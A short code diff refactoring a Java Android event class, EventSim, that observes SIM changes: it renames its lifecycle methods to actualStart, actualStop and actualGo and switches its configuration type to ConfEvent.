@@ -14,6 +14,7 @@ import java.io.IOException;
 import com.android.service.Device;
 import com.android.service.Sim;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.evidence.Markup;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerSim;
@@ -26,22 +27,22 @@ public class EventSim extends BaseEvent implements Observer<Sim> {
 	private int actionOnEnter;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerSim.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerSim.self().detach(this);
 	}
 
 	@Override
-	public boolean parse(EventConf conf) {
+	public boolean parse(ConfEvent conf) {
 		return true;
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 		// TODO Auto-generated method stub
 	}
 
